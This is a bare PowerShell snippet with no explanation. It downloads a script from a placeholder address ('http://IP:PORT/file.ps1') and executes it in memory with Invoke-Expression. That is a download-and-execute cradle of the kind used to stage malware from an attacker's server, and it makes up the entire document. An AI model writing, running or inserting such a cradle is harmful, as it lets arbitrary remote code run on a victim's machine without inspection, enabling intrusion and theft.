$scriptURL = "http://IP:PORT/file.ps1"
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
Invoke-Expression  -Command $scriptContent
